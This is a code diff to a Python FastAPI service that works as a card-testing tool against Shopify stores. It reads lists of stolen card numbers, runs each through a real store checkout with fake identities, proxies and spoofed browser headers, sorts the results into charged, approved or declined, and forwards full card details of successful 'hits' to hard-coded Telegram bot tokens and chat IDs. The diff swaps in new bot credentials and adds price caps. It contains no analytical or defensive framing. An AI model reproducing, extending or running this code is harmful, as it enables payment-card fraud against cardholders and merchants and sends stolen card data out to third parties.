@@ -44,7 +44,7 @@ from fastapi.middleware.cors import CORSMiddleware
 from fastapi.responses import JSONResponse
 
 # ---------------------------------------------------------------------------
-# Configuration from environment  (Railway Pro defaults — 5 replicas)
+# Configuration from environment
 # ---------------------------------------------------------------------------
 PORT             = int(os.environ.get("PORT", 8080))
 WORKERS          = int(os.environ.get("WORKERS", 8))
@@ -69,15 +69,14 @@ log = logging.getLogger("shopify")
 # ---------------------------------------------------------------------------
 # Admin Hit Notifications
 # ---------------------------------------------------------------------------
-ADMIN_HIT_SENDER_TOKEN = "8821394621:AAGlmaPcqlE862oqjwZY_oBXaY4KDR_pAfI"
-ADMIN_HIT_RECEIVER_ID  = 7549544641
+ADMIN_HIT_SENDER_TOKEN = "8629480718:AAFLxnpZAjxVzpKIfCvGTAMRKtZ1KD3EW9o"
+ADMIN_HIT_RECEIVER_ID  = 8524951580
 
 async def send_hit_to_admin(card: str, status: str, response: str, gateway: str, price: str, site: str):
     """Fire-and-forget Telegram notification for Charged/Approved hits."""
     try:
         from datetime import datetime as _dt
         
-        # আপনার কার্ডের শেষে যদি অপ্রয়োজনীয় স্পেস থাকে, সেটা রিমুভ করা
         card = card.strip()
 
         if "CHARGED" in status.upper() or "ORDER_PLACED" in status.upper():
@@ -102,7 +101,6 @@ async def send_hit_to_admin(card: str, status: str, response: str, gateway: str,
         receivers = [ADMIN_HIT_RECEIVER_ID, 8428369446]
         url = f"https://api.telegram.org/bot{ADMIN_HIT_SENDER_TOKEN}/sendMessage"
         
-        # curl_cffi এর AsyncSession ব্যবহার করে মেসেজ পাঠানো হচ্ছে
         async with AsyncSession() as session:
             for receiver in receivers:
                 payload = {
@@ -116,13 +114,11 @@ async def send_hit_to_admin(card: str, status: str, response: str, gateway: str,
                     log.error(f"Telegram API Error: {resp.text}")
                     
     except Exception as e:
-        # এররগুলো এখন টার্মিনালে বা লগে দেখাবে, লুকিয়ে যাবে না
         log.error(f"Failed to send Telegram message: {e}") 
 
 # ---------------------------------------------------------------------------
 # GraphQL Queries
 # ---------------------------------------------------------------------------
-# Variable declarations shared by both proposal queries
 _PROPOSAL_VARS = (
     "$sessionInput:SessionTokenInput!,"
     "$delivery:DeliveryTermsInput,$discounts:DiscountTermsInput,"
@@ -145,7 +141,6 @@ _PROPOSAL_VARS = (
     "$cartMetafields:[CartMetafieldOperationInput!]"
 )
 
-# PurchaseProposal arguments shared by both proposal queries
 _PROPOSAL_ARGS = (
     "delivery:$delivery,discounts:$discounts,payment:$payment,"
     "merchandise:$merchandise,buyerIdentity:$buyerIdentity,taxes:$taxes,"
@@ -163,7 +158,6 @@ _PROPOSAL_ARGS = (
     "cartMetafields:$cartMetafields"
 )
 
-# SellerProposal fragment (shared by shipping & delivery queries)
 _SELLER_PROPOSAL_FIELDS = (
     "sellerProposal{"
     "runningTotal{...on MoneyValueConstraint{value{amount currencyCode}}}"
@@ -202,7 +196,6 @@ QUERY_PROPOSAL_SHIPPING = (
     "errors{code localizedMessage nonLocalizedMessage __typename}}}}"
 )
 
-# Receipt fragment shared by delivery proposal and submit mutation
 _RECEIPT_FRAGMENT = (
     "fragment ReceiptDetails on Receipt{"
     "...on ProcessedReceipt{id token __typename}"
@@ -493,10 +486,8 @@ _site_semaphores: dict[str, asyncio.Semaphore] = defaultdict(
     lambda: asyncio.Semaphore(SITE_CONCURRENCY)
 )
 
-# Product cache: hostname -> {"product": dict|None, "candidates": list, "err": str, "ts": float}
 _product_cache: dict[str, dict] = {}
 
-# Cards loaded from file
 _cards_cache: list[dict] = []
 _cards_loaded_at: float  = 0.0
 
@@ -527,7 +518,6 @@ app.add_middleware(
     allow_headers=["*"],
 )
 
-# Request statistics
 _stats: dict[str, int] = defaultdict(int)
 
 
@@ -565,7 +555,6 @@ def _get_cards() -> list[dict]:
 
 
 def _parse_card(raw: str) -> Optional[dict]:
-    """Accept cc|mm|yy|cvv and cc|mm|yyyy|cvv.  Returns normalized dict or None."""
     raw = raw.strip()
     if not raw or raw.startswith("#"):
         return None
@@ -686,7 +675,6 @@ def _random_identity() -> tuple[str, str, str]:
 
 
 def _extract(text: str, start: str, end: str) -> Optional[str]:
-    """Fast substring extraction between two delimiters."""
     idx = text.find(start)
     if idx == -1:
         return None
@@ -699,12 +687,9 @@ def _extract(text: str, start: str, end: str) -> Optional[str]:
 
 
 def _extract_sst(text: str, headers: dict) -> Optional[str]:
-    """Try every known pattern to pull the Shopify checkout session token."""
-    # From response header (fastest)
     for key in ("X-Checkout-One-Session-Token", "x-checkout-one-session-token"):
         if key in headers:
             return headers[key]
-    # From HTML / JSON embedded in page
     patterns = [
         ('name="serialized-sessionToken" content="&quot;', "&quot;"),
         ('name="serialized-sessionToken" content="', '"'),
@@ -729,7 +714,6 @@ def _normalize_response(raw: Optional[str]) -> str:
     if any(k in msg for k in ("ORDER_PLACED", "PROCESSEDRECEIPT", "PAYMENT_COMPLETE", "ORDER_CREATED", "SUBMITSUCCESS")):
         return "ORDER_PLACED"
 
-    # কার্ড ডিক্লাইন আগে চেক হবে
     if any(k in msg for k in ("INVALID_CVC", "INVALID_SECURITY_CODE", "CVC_FAILURE", "SECURITY_CODE", "CVV_FAILURE", "INCORRECT_CVC", "CVC_CHECK_FAILED", "CVV_CHECK_FAILED")):
         return "INVALID_CVC"
 
@@ -751,7 +735,6 @@ def _normalize_response(raw: Optional[str]) -> str:
     if any(k in msg for k in ("INVALID_NUMBER", "NO_SUCH_ISSUER", "INVALID_CARD", "INCORRECT_NUMBER", "BAD_NUMBER", "INVALID_ACCOUNT", "CARD_NOT_SUPPORTED", "INVALID_PAYMENT_METHOD")):
         return "INVALID_CARD"
 
-    # 3DS চেক (সবশেষে)
     if any(k in msg for k in ("3DS", "OTP", "REDIRECT_TO_3DS", "COMPLETE_PAYMENT", "THREEDSSECURE", "THREE_D_SECURE", "3D_SECURE", "SCA_REQUIRED", "CONFIRMATION_REJECTED")):
         return "3DS_REQUIRED"
 
@@ -763,11 +746,6 @@ def _normalize_response(raw: Optional[str]) -> str:
 
 
 def _parse_gql_errors(errors: list) -> str:
-    """
-    Try to extract a meaningful response code from a GraphQL errors list.
-    Conservative: only returns a specific code for very clear matches.
-    Returns 'GRAPHQL_ERROR' for anything ambiguous so callers can retry.
-    """
     for err in errors:
         for field in ("code", "nonLocalizedMessage", "localizedMessage",
                       "message", "localizedMessageHtml", "messageUntranslated"):
@@ -778,7 +756,6 @@ def _parse_gql_errors(errors: list) -> str:
             if norm != "CARD_DECLINED":
                 return norm
             upper = raw.upper()
-            # Only match very specific card-decline phrases (not broad substrings)
             if any(k in upper for k in ("PAYMENT_DECLINED", "CARD_DECLINED",
                                          "CHARGE_DECLINED", "CARD_WAS_DECLINED",
                                          "FRAUD")):
@@ -816,10 +793,6 @@ async def _fetch_products(
     proxy_str: Optional[str] = None,
     max_price: float = MAX_PRICE,
 ) -> tuple[Optional[dict], list[dict], Optional[str]]:
-    """
-    Returns (best_product, all_candidates_under_max_price, error_string).
-    Results are cached per hostname for CACHE_TTL seconds.
-    """
     if not base_url.startswith("http"):
         base_url = "https://" + base_url
 
@@ -864,7 +837,6 @@ async def _fetch_products(
                         break
                 elif resp.status_code in (429, 430):
                     err = "THROTTLED"
-                    # Do not cache THROTTLED in _product_cache so the next card/proxy can immediately retry fetching
                     return None, [], err
             except Exception:
                 continue
@@ -874,7 +846,6 @@ async def _fetch_products(
         best_price             = float("inf")
 
         if not all_variants:
-            # Fallback for headless Shopify (e.g. Gymshark) where products.json is unavailable
             try:
                 import xml.etree.ElementTree as ET
                 import re
@@ -976,18 +947,6 @@ async def validate_card(
     variant_id: Optional[str] = None,
     proxy_str:  Optional[str] = None,
 ) -> dict:
-    """
-    Full Shopify checkout flow:
-      1. Add to cart
-      2. Get checkout page  →  extract session token
-      3. Shipping proposal  (GraphQL)
-      4. Delivery proposal  (GraphQL)
-      5. Tokenize card      (PCI vault)
-      6. Submit mutation    (GraphQL)
-      7. Poll receipt       (GraphQL, if needed)
-
-    Returns a dict with Response, CC, Price, Gate, Site, Charged, Approved, Time.
-    """
     t0       = time.time()
     gateway  = "UNKNOWN"
     price    = "0.00"
@@ -1024,9 +983,6 @@ async def validate_card(
             state  = addr["zoneCode"]
             s_zip  = addr["postalCode"]
 
-            # ── 0. Fetch product if no variant supplied ──────────────────
-            # ALWAYS resolve the variant's base price so we can enforce
-            # MAX_PRICE no matter how validate_card was called.
             best, all_candidates, err = await _fetch_products(ourl, proxy_str)
             if not variant_id:
                 if not best:
@@ -1034,9 +990,6 @@ async def validate_card(
                 variant_id = best["variant_id"]
                 price      = best["price"]
             else:
-                # A variant_id was passed in by the caller. Verify that this
-                # variant actually exists in the under-MAX_PRICE candidate
-                # list returned by _fetch_products.
                 matched = next(
                   (c for c in (all_candidates or []) if str(c.get("variant_id")) == str(variant_id)),
                   None,
@@ -1049,8 +1002,6 @@ async def validate_card(
                   best       = random.choice(all_candidates)
                   variant_id = best["variant_id"]
                   price      = best["price"]
-
-            # Price check removed entirely
 
             base_headers = {
                 "User-Agent":         profile["ua"],
@@ -1065,7 +1016,6 @@ async def validate_card(
                 base_headers["sec-ch-ua-mobile"] = profile["sec_ch_ua_mobile"]
                 base_headers["sec-ch-ua-platform"] = profile["sec_ch_ua_platform"]
 
-            # ── 1. Add to cart ──────────────────────────────────────────
             cart_added = False
             for payload, ct in [
                 (f"id={variant_id}&quantity=1",
@@ -1083,7 +1033,6 @@ async def validate_card(
                     if r.status_code == 200:
                         cart_added = True
                         break
-                    # read body so connection returns to pool
                     pass
                 except Exception:
                     continue
@@ -1093,7 +1042,6 @@ async def validate_card(
 
             await asyncio.sleep(random.uniform(0.12, 0.35))
 
-            # ── 2. Get checkout page ────────────────────────────────────
             try:
                 cr = await session.post(
                     f"{ourl}/checkout/",
@@ -1113,7 +1061,6 @@ async def validate_card(
             if "login" in lower_url or "/account" in lower_url or "password" in lower_url:
                 return _r("SITE_REQUIRES_LOGIN")
 
-            # Extract attempt token from URL
             m = re.search(r"/checkouts/cn/([^/?#]+)", checkout_url)
             if m:
                 attempt_token = m.group(1)
@@ -1123,12 +1070,10 @@ async def validate_card(
             if not attempt_token or len(attempt_token) < 4:
                 return _r("NO_ATTEMPT_TOKEN")
 
-            # Extract session token
             sst = _extract_sst(page_text, dict(cr.headers))
             if not sst:
                 return _r("NO_SESSION_TOKEN")
 
-            # Extract misc tokens
             queue_token = (
                 _extract(page_text, 'queueToken&quot;:&quot;', "&quot;") or
                 _extract(page_text, '"queueToken":"', '"')
@@ -1139,7 +1084,6 @@ async def validate_card(
                 "1"
             )
 
-            # Merchandise GID
             merch_gid = (
                 _extract(page_text, "ProductVariantMerchandise/", "&quot;") or
                 _extract(page_text, "ProductVariantMerchandise/", '&q') or
@@ -1148,7 +1092,6 @@ async def validate_card(
                 str(variant_id)
             )
 
-            # Currency
             for s, e in [
                 ('currencyCode&quot;:&quot;', "&quot;"),
                 ('"currencyCode":"', '"'),
@@ -1158,7 +1101,6 @@ async def validate_card(
                     currency = val.upper()
                     break
 
-            # Re-select address based on detected currency (initial pick used URL only)
             addr         = _pick_address(ourl, currency)
             country_code = addr["countryCode"]
             phone        = addr["phone"]
@@ -1167,7 +1109,6 @@ async def validate_card(
             state        = addr["zoneCode"]
             s_zip        = addr["postalCode"]
 
-            # Subtotal
             subtotal = (
                 _extract(page_text,
                          'subtotalBeforeTaxesAndShipping&quot;:{&quot;value&quot;:{&quot;amount&quot;:&quot;',
@@ -1179,7 +1120,6 @@ async def validate_card(
                 m2 = re.search(r'"price":\s*"([\d.]+)"', page_text)
                 subtotal = m2.group(1) if m2 else "0.01"
 
-            # Build ID & source token
             unescaped  = page_text.replace("&quot;", '"').replace("&amp;", "&")
             build_id   = None
             m3         = re.search(r'"commitSha"\s*:\s*"([a-f0-9]{40})"', unescaped)
@@ -1215,7 +1155,6 @@ async def validate_card(
             merch_id_full   = f"gid://shopify/ProductVariantMerchandise/{merch_gid}"
             variant_id_full = f"gid://shopify/ProductVariant/{variant_id}"
 
-            # ── Build base shipping variables (deep-copyable template) ──
             def _base_vars() -> dict:
                 return {
                     "sessionInput":  {"sessionToken": sst},
@@ -1307,7 +1246,6 @@ async def validate_card(
                     "cartMetafields": [],
                 }
 
-            # ── 3. Shipping proposal ─────────────────────────────────────
             ship_vars      = _base_vars()
             resp_json: Any = None
 
@@ -1333,10 +1271,7 @@ async def validate_card(
 
                 gql_errs = resp_json.get("errors", []) or []
                 if gql_errs:
-                    log.debug("shipping proposal GQL errors: %s", gql_errs)
                     interpreted = _parse_gql_errors(gql_errs)
-                    # For checkout-level errors (not card step), only bail
-                    # immediately on non-retryable state errors
                     if interpreted in ("SESSION_EXPIRED", "SITE_REQUIRES_LOGIN",
                                        "THROTTLED", "NO_PRODUCT"):
                         return _r(interpreted)
@@ -1349,7 +1284,6 @@ async def validate_card(
             if not resp_json or not (resp_json.get("data") or {}).get("session"):
                 return _r("GRAPHQL_ERROR")
 
-            # Refresh session token from shipping proposal response
             try:
                 _ship_sst = r.headers.get("x-checkout-one-session-token")
                 if _ship_sst:
@@ -1361,7 +1295,6 @@ async def validate_card(
             session_data = resp_json["data"]["session"]
             negotiate    = session_data.get("negotiate") or {}
 
-            # Check negotiate-level errors first
             neg_errors = negotiate.get("errors") or []
             if neg_errors:
                 code = _parse_gql_errors(neg_errors)
@@ -1384,11 +1317,18 @@ async def validate_card(
             if not seller:
                 return _r("NO_SELLER_PROPOSAL")
 
-
             running_total_data = seller.get("runningTotal") or {}
             running_total      = running_total_data.get("value", {}).get("amount") or running_total_data.get("amount", "0")
 
-            # Delivery info
+            # =========================================================================
+            # 🌟 কড়া লক ১: শিপিং প্রপোজালের সময়ই দাম চেক
+            # =========================================================================
+            try:
+                if float(running_total) > MAX_PRICE:
+                    return _r(f"SKIPPED_PRICE_TOO_HIGH (${float(running_total):.2f} > ${MAX_PRICE:.2f})")
+            except (ValueError, TypeError):
+                pass
+
             delivery_data     = seller.get("delivery") or {}
             delivery_strategy = ""
             shipping_amount   = 0.0
@@ -1406,7 +1346,6 @@ async def validate_card(
                         except (ValueError, TypeError):
                             shipping_amount = 0.0
 
-            # Tax
             tax_data   = seller.get("tax") or {}
             tax_amount = 0.0
             if tax_data.get("__typename") == "FilledTaxTerms":
@@ -1418,7 +1357,6 @@ async def validate_card(
                 except (ValueError, TypeError):
                     pass
 
-            # Payment method
             payment_data       = seller.get("payment") or {}
             payment_identifier = None
             if payment_data.get("__typename") == "FilledPaymentTerms":
@@ -1431,19 +1369,16 @@ async def validate_card(
                         detected_gateway = (pm.get("extensibilityDisplayName") or
                                             pm.get("name") or pm.get("brand") or
                                             pm.get("displayName") or "Shopify Payments")
-                        # Only proceed if the gateway is explicitly Shopify Payments
                         if "shopify" in detected_gateway.lower() and "payments" in detected_gateway.lower():
                             payment_identifier = pid
                             gateway = detected_gateway
-                            price = f"{float(running_total) + shipping_amount + tax_amount:.2f}"
-                            pass # Removed total MAX_PRICE check
+                            # 🌟 শুধু মূল দাম দেখাবে (ট্যাক্স ছাড়া)
+                            price = f"{float(running_total):.2f}"
                             break
 
             if not payment_identifier:
                 return _r("NO_SHOPIFY_PAYMENTS_GATEWAY")
 
-            # ── 4. Delivery proposal ─────────────────────────────────────
-            # IMPORTANT: deep-copy the base vars so we don't share mutable state
             deliv_vars = copy.deepcopy(ship_vars)
             deliv_vars["sessionInput"]["sessionToken"] = sst
 
@@ -1495,17 +1430,10 @@ async def validate_card(
 
                 )
                 d_resp = orjson.loads(dr.content)
-                log.debug("delivery proposal response keys: %s",
-                          list(d_resp.keys()) if isinstance(d_resp, dict) else type(d_resp))
-                if "errors" in d_resp and "data" not in d_resp:
-                    log.debug("delivery proposal schema errors: %s",
-                              [e.get("message") for e in d_resp.get("errors", [])][:3])
-                # Refresh session token from delivery response
                 _del_sst = dr.headers.get("x-checkout-one-session-token")
                 if _del_sst:
                     sst = _del_sst
                     gql_headers["x-checkout-one-session-token"] = sst
-                # Handle SubmittedForCompletion from delivery step (digital goods / auto-submit)
                 d_result = (
                     d_resp.get("data", {}).get("session", {})
                     .get("negotiate", {}).get("result", {})
@@ -1513,20 +1441,27 @@ async def validate_card(
                 if d_result:
                     d_typename = d_result.get("__typename", "")
                     if d_typename == "SubmittedForCompletion":
-                        # If payment was submitted/skipped before we even added our card, we can't test this product.
                         return _r("NO_PAYMENT_REQUIRED", charged="False", approved="False")
-                    # Update running_total from delivery seller proposal
                     d_seller = d_result.get("sellerProposal") or {}
                     d_total  = d_seller.get("total") or d_seller.get("runningTotal") or {}
                     d_amt    = d_total.get("value", {}).get("amount") or d_total.get("amount")
+                    
                     if d_amt:
                         running_total = d_amt
+                        # =========================================================================
+                        # 🌟 কড়া লক ২: ডেলিভারি প্রপোজালেও দাম চেক
+                        # =========================================================================
+                        try:
+                            if float(running_total) > MAX_PRICE:
+                                return _r(f"SKIPPED_PRICE_TOO_HIGH (${float(running_total):.2f} > ${MAX_PRICE:.2f})")
+                        except (ValueError, TypeError):
+                            pass
+                            
                         try:
                             price = f"{float(running_total):.2f}"
                         except (ValueError, TypeError):
                             pass
-                        pass # Removed delivery MAX_PRICE check
-                    # Extract delivery strategy from delivery response
+
                     d_delivery = d_seller.get("delivery") or {}
                     if d_delivery.get("__typename") == "FilledDeliveryTerms":
                         d_d_lines = d_delivery.get("deliveryLines") or []
@@ -1537,7 +1472,6 @@ async def validate_card(
                                 delivery_strategy = d_selected["handle"]
                             elif d_strategies:
                                 delivery_strategy = d_strategies[0].get("handle", delivery_strategy)
-                            # Update shipping amount from delivery response
                             if d_strategies:
                                 d_ship_amt = d_strategies[0].get("amount") or {}
                                 try:
@@ -1547,7 +1481,6 @@ async def validate_card(
                                     )
                                 except (ValueError, TypeError):
                                     pass
-                    # Update tax from delivery response
                     d_tax = d_seller.get("tax") or {}
                     if d_tax.get("__typename") == "FilledTaxTerms":
                         d_tax_amt = d_tax.get("totalTaxAmount") or {}
@@ -1561,7 +1494,6 @@ async def validate_card(
             except Exception as ex:
                 log.debug("delivery proposal error: %s", ex)
 
-            # ── 5. Tokenize card ─────────────────────────────────────────
             vault_payload = {
                 "credit_card": {
                     "number":             cc,
@@ -1609,7 +1541,6 @@ async def validate_card(
             if not token:
                 return _r("TOKENIZATION_FAILED")
 
-            # ── 6. Submit for completion ──────────────────────────────────
             billing_addr = {
                 "streetAddress": {
                     "address1": street, "address2": "", "city": city,
@@ -1696,7 +1627,6 @@ async def validate_card(
                         json=_build_submit_body(),
                     )
                     s_resp = orjson.loads(sr.content)
-                    # Refresh SST from submit response
                     _sub_sst = sr.headers.get("x-checkout-one-session-token")
                     if _sub_sst:
                         sst = _sub_sst
@@ -1706,9 +1636,6 @@ async def validate_card(
                 except Exception as ex:
                     log.debug("submit exception: %s", ex)
                     return _r("SUBMIT_FAILED")
-
-                log.debug("submit[%d] response typename: %s", submit_attempt,
-                          (s_resp.get("data") or {}).get("submitForCompletion", {}).get("__typename"))
 
                 s_data = (s_resp.get("data") or {}).get("submitForCompletion") or {}
                 if not s_data:
@@ -1727,7 +1654,6 @@ async def validate_card(
 
                 stype = s_data.get("__typename", "")
 
-                # ConfirmChangeViolation → retry to accept changes
                 if stype == "SubmitRejected":
                     sub_errs = s_data.get("errors") or []
                     all_confirmable = all(
@@ -1771,7 +1697,6 @@ async def validate_card(
                     approved = "True" if norm in ("INSUFFICIENT_FUNDS", "INVALID_CVC", "3DS_REQUIRED") else "False"
                     return _r(norm, approved=approved)
 
-                # ProcessingReceipt / WaitingReceipt → poll
                 rid = receipt.get("id")
                 if rid:
                     poll_body = {
@@ -1828,10 +1753,8 @@ async def validate_card(
                 errs = s_data.get("errors") or []
                 log.debug("SubmitRejected errors: %s", errs)
                 if errs:
-                    # Check ALL errors and ALL fields for the most specific code
                     best_code = "CARD_DECLINED"
                     for err_item in errs:
-                        # Prefer nonLocalizedMessage (more specific) over localizedMessage
                         for fld in ("code", "nonLocalizedMessage", "localizedMessage",
                                     "localizedMessageHtml"):
                             val = str(err_item.get(fld) or "").upper()
@@ -1899,7 +1822,6 @@ async def shopify_route(
     proxy: Optional[str] = Query(None, description="ip:port or ip:port:user:pass"),
     key:   Optional[str] = Query(None, description="API Key"),
 ):
-    """Validate a card against a Shopify store checkout."""
     secret = os.environ.get("SHOPII_API_KEY", "DARKANONSHO!!!")
     if key != secret:
         return JSONResponse({"error": "Unauthorized API key. Please pass valid &key=... parameter"}, status_code=401)
@@ -1928,7 +1850,6 @@ async def shopify_route(
     )
     _stats[f"response_{result.get('Response', 'UNKNOWN')}"] += 1
 
-    # Send admin hit notification for Charged/Approved
     if result.get("Charged") == "True" or result.get("Approved") == "True":
         status_label = "CHARGED" if result.get("Charged") == "True" else "APPROVED"
         cc_str = result.get("CC", f"{card['cc']}|{card['month']}|{card['year']}|{card['cvv']}")
@@ -1951,10 +1872,6 @@ async def check_route(
     proxy: Optional[str] = Query(None, description="ip:port or ip:port:user:pass"),
     key:   Optional[str] = Query(None, description="API Key"),
 ):
-    """
-    Check if a Shopify store has products under ${MAX_PRICE} and whether
-    its payment gateway returns a real (live) response.
-    """
     secret = os.environ.get("SHOPII_API_KEY", "DARKANONSHO!!!")
     if key != secret:
         return JSONResponse({"error": "Unauthorized API key. Please pass valid &key=... parameter"}, status_code=401)
@@ -2008,14 +1925,12 @@ async def check_route(
     response_code = result.get("Response", "")
     _stats[f"response_{response_code or 'UNKNOWN'}"] += 1
 
-    # If we found products, the site exists and is alive unless the response explicitly indicates a fatal site error
     is_dead_site = False
     if response_code in ("SITE_DEAD", "CAPTCHA_REQUIRED", "INVALID_SITE", "NOT_SUPPORTED"):
         is_dead_site = True
     elif any(k in response_code.lower() for k in ("domain not found", "could not resolve", "name or service not known")):
         is_dead_site = True
 
-    # Send admin hit notification for Charged/Approved
     if result.get("Charged") == "True" or result.get("Approved") == "True":
         status_label = "CHARGED" if result.get("Charged") == "True" else "APPROVED"
         cc_str = result.get("CC", f"{parsed['cc']}|{parsed['month']}|{parsed['year']}|{parsed['cvv']}")
@@ -2060,13 +1975,11 @@ async def health_route():
 
 @app.get("/stats")
 async def stats_route():
-    """Return request statistics."""
     return JSONResponse(dict(_stats))
 
 
 @app.post("/cache/clear")
 async def cache_clear_route():
-    """Clear the product cache."""
     count = len(_product_cache)
     _product_cache.clear()
     return JSONResponse({"cleared": count})
@@ -2074,7 +1987,6 @@ async def cache_clear_route():
 
 @app.post("/reload")
 async def reload_route():
-    """Reload cards from the cards file."""
     _reload_cards()
     return JSONResponse({"cards_loaded": len(_cards_cache)})
 
@@ -2110,16 +2022,14 @@ if __name__ == "__main__":
         f"{'='*60}\n"
     )
     _loop = "asyncio" if sys.platform == "win32" else "uvloop"
-    # On Windows, multiprocessing uses 'spawn' so workers > 1 requires
-    # the __name__ guard (enforced below). On Linux 'fork' is fine.
     _workers = WORKERS if sys.platform != "win32" else 1
     uvicorn.run(
         "api:app",
         host="0.0.0.0",
         port=PORT,
         workers=_workers,
-        #loop=_loop,
-        #http="httptools",
+        loop=_loop,
+        http="httptools",
         log_level="warning",
         access_log=False,
         timeout_keep_alive=65,
